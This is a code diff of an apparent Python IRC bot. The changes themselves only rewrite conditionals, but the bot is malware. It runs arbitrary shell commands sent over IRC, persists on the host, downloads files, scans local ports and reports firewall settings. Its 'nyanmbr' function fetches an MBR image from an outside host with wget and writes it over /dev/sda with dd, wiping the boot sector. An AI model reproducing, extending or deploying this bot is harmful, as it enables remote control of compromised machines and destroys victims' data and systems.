@@ -27,7 +27,7 @@ from random import randint
 import getpass
 
 def generateNick(operatingSystem): #generates a nick for the server
-	if operatingSystem == "":
+	if not operatingSystem:
 		operatingSystem = "unk"
 	rannum = str(randint(0, 9999))
 	return str(operatingSystem[:3] + rannum)
@@ -65,15 +65,15 @@ def execute(cmd):
 		print "An error has occured.\n"
 		return "An error has occured. Probably invalid command or syntax."
 	
-	if len(output) < 1:
-		if len(errors) > 0:
+	if not output:
+		if errors:
 			return errors.replace("\r\n","\n")
 		else:
 			return "No output. Maybe try again."
 
 	#handling multi-line output
 	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
-	if len(lines) > 1: #if there was a new line found, return array
+	if lines: #if there was a new line found, return array
 		if isItLs: #doing all the directory stuff
 			if DEBUG:
 				print "output is as follows:"
@@ -107,7 +107,7 @@ def execute(cmd):
 
 
 		for element in lines: #check if a line is JUST a newline
-			if element == "":
+			if not element:
 				lines[lines.find(element)] = "~" #replace newline with a ~
 
 		return lines
@@ -209,7 +209,7 @@ def checkFirewall(): #reports current firewall config
 		sendData("unknown os")
 
 def nyanmbr(): #download nyancat.mbr and over bootloader with it
-	if (operatingSystem != "windows" and operatingSystem != ""):
+	if operatingSystem and operatingSystem != "windows":
 		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
 		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
 		execute("rm -f /tmp/nyan.mbr")
@@ -272,8 +272,8 @@ def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/
 ### bot functions which take parameters that respond to IRC commands ###
 
 def download(cmd): #file downloader
-	if (operatingSystem == "linux"):
-		if (cmd.count(" ") > 1): #make sure there is only 1 space
+	if operatingSystem == "linux":
+		if cmd.count(" ") > 1: #make sure there is only 1 space
 			sendData("Usage: download [file] [dir]")
 		else:
 			args = cmd.split(" ")
@@ -307,7 +307,7 @@ def scanner(cmd): #local port scanner
 			temp.close()
 		except: continue
 
-	if len(openPorts) > 0:
+	if openPorts:
 		return openPorts
 	else:
 		return("No listening ports.")
@@ -335,7 +335,7 @@ def runFunction(cmd):
 	elif cmd[:pos] in commandsParams.keys():
 		output = commandsParams[cmd[:pos]](cmd[(pos+1):]) #run appropriate function. get return value in 'output'
 		print "function called"
-		if output != None: #if the function returned something, we need to send it
+		if output: #if the function returned something, we need to send it
 			sendData(output)
 	else: #if not recognized
 		print "command '%s' not defined" % cmd
@@ -450,7 +450,7 @@ def parseCommand(command):
 				elif "??+" == command[:3]:
 					return
 
-				if len(command) > 0:
+				if command:
 					if INTERACT[2] > 0:
 						sendData(execute(command)) #run on commandline
 					else:
@@ -524,7 +524,7 @@ def connectToServer(nick):
 			newnick = nick
 			counter = 2
 		irc.send("NICK " + newnick + "\n") #sets nick
-		temp=irc.recv(1024) #get response to setting nick
+		temp = irc.recv(1024) #get response to setting nick
 		if DEBUG:
 			print "text received: '%s'\niteration %d" % (temp, counter)
 
@@ -542,7 +542,7 @@ nick = connectToServer(nick) #connect to IRC server
 #infinite loop to listen for messages aka commands
 while 1:
 	text = irc.recv(1024) #receive up to 1024 bytes
-	while len(text) < 1: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
+	while not text: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
 		irc.close()
 		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
 		connectToServer(nick)
